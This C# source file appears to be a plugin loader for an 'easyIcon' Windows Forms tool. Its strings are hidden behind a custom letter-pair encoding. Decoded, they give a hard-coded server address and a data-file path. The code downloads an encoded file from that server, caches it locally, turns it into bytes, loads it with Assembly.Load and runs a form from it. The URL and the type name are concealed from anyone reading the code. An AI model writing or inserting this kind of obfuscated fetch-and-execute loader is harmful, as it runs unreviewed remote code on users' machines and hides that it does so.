using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Sci
{
    public class EncoderXXX
    {
        /// <summary> 
        /// 解析字母字符串
        /// </summary>
        public static string DecodeAlphabet(string data)
        {
            byte[] B = new byte[data.Length / 2];
            char[] C = data.ToCharArray();
            for (int i = 0; i < C.Length; i += 2)
            {
                byte b = ToByte(C[i], C[i + 1]);
                B[i / 2] = b;
            }
            return System.Text.Encoding.UTF8.GetString(B);
        }
        
        /// <summary>  
        /// 每两个字母还原为一个字节
        /// </summary>
        private static byte ToByte(char a1, char a2)
        {
            return (byte)((a1 - 'a') * 16 + (a2 - 'a'));
        }
    }
        


    class easyIconFunc
    {
        private static string StringDatas103 = "hhhhhhcohdgdgjgngfgogdgfcogdgodkdidadadd$gfgbhdhjejgdgpgoeghfgocogngbgjgoeggphcgn$ohlnjbohlljmoilfieoglkjaofikkaoilnlnofkelboilekfoplmimoikplhofifiioilpjoogiokfohlnjbohlljmofiginoelnlpohjekiogknkeoflhkfofiflhoplmib$gihehehadkcpcp$cphdhcgdcphdgdgjhegpgpgmhdcpeeebfeebcpgfgbhdhjejgdgpgoeghfgocogegbhegb$gegbhegbffhcgm$$cp$gfgoggglgkgbdegegbdghadegbdegmgjgbdbdegfgbdbdb$gfgoggglgkgbgbgbgbgegbgbgbgbgbgbgbgfgbgbgbgbgbgbhahahahagbgbgbgbgmgjgbgbgbgbgbgbgbgbgbgbgbgbgbgbgfgbgbgbgbgbgbgbgbgbgbgb$hdgihcgjgoglfdhehc";
        private static string[] StringDatas103A = null;
        
        private static string Decodex101(int index104)
        {
            if (StringDatas103A == null) StringDatas103A = StringDatas103.Split((char)(',' - 8));    // '$'
            string data = StringDatas103A[index104];
            data = EncoderXXX.DecodeAlphabet(data);
            return data;
        }


        public static string ServerAddress = Decodex101(0);
        private static Assembly asm = null;

        /// <summary>
        /// 初始化
        /// </summary>
        public static Form mainForm()
        {
            Form mainform = null;
            if (asm == null)
            {
                byte[] data = GetByte();
                if (data.Length > 0) asm = Assembly.Load(data);
            }

            if (asm != null)
            {
                mainform = (Form)asm.CreateInstance(Decodex101(1), false);
            }

            if (mainform == null && !System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                MessageBox.Show(Decodex101(2));
            }

            return mainform;
        }


        #region easyIcon工具插件

        public static byte[] GetByte()
        {
            string data_run = getData(Decodex101(3) + ServerAddress + Decodex101(4));

            byte[] bytes = ToBytes(data_run);
            return bytes;
        }

        /// <summary>  
        /// 解析字符串为Bytes数组
        /// </summary>  
        private static byte[] ToBytes(string data)
        {
            data = restore(data);
            byte[] B = new byte[data.Length / 2];
            char[] C = data.ToCharArray();

            for (int i = 0; i < C.Length; i += 2)
            {
                byte b = ToByte(C[i], C[i + 1]);
                B[i / 2] = b;
            }

            return B;
        }

        /// <summary>  
        /// 每两个字母还原为一个字节  
        /// </summary>  
        private static byte ToByte(char a1, char a2)
        {
            return (byte)((a1 - 'a') * 16 + (a2 - 'a'));
        }

        /// <summary>
        /// 从指定dataUrl载入数据，并在本地缓存
        /// </summary>
        /// <param name=Decodex101(5)></param>
        /// <returns></returns>
        private static string getData(string dataUrl)
        {
            string data = Decodex101(6);
            try
            {
                string fileName = dataUrl.Substring(dataUrl.LastIndexOf(Decodex101(7)) + 1);
                string localPath = AppDomain.CurrentDomain.BaseDirectory + fileName;

                // 优先从本地载入数据
                if (File.Exists(localPath))
                {
                    long lastModify = new FileInfo(localPath).LastWriteTime.Ticks;
                    long secondSpace = (DateTime.Now.Ticks - lastModify) / 10000000;

                    bool networkAvaliable = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
                    if (secondSpace > 86400 * 7 && networkAvaliable)    // 超出7天，删除缓存文件
                    {
                        File.Delete(localPath);
                    }
                    else
                    {
                        data = File.ReadAllText(localPath).Trim();
                        if (data.Trim().Equals(Decodex101(6))) File.Delete(localPath);
                    }
                }

                // 若本地无数据，则从网址加载
                if (!File.Exists(localPath))
                {
                    System.Net.WebClient client = new System.Net.WebClient();
                    data = client.DownloadString(dataUrl).Trim();

                    File.WriteAllText(localPath, data);     // 本地缓存
                }

            }
            catch (Exception) { }
            return data;
        }


        /// <summary>
        /// 还原为原有串信息
        /// Decodex101(8) -> 
        /// Decodex101(9)
        /// </summary>
        /// <param name=Decodex101(10)></param>
        /// <returns></returns>
        public static string restore(string shrinkStr)
        {
            char C = ' ';
            StringBuilder builder = new StringBuilder();
            string numStr = Decodex101(6);

            foreach (char c in shrinkStr)
            {
                if ('a' <= c && c <= 'z')
                {
                    if (!numStr.Equals(Decodex101(6)))
                    {
                        int n = Int32.Parse(numStr);
                        while (n-- > 1) builder.Append(C.ToString());
                        numStr = Decodex101(6);
                    }

                    builder.Append(c.ToString());
                    C = c;
                }
                else if ('0' <= c && c <= '9')
                {
                    numStr += c.ToString();
                }
            }

            if ('a' <= C && C <= 'z')
            {
                if (!numStr.Equals(Decodex101(6)))
                {
                    int n = Int32.Parse(numStr);
                    while (n-- > 1) builder.Append(C.ToString());
                    numStr = Decodex101(6);
                }
            }

            return builder.ToString();
        }

        #endregion
    }
}

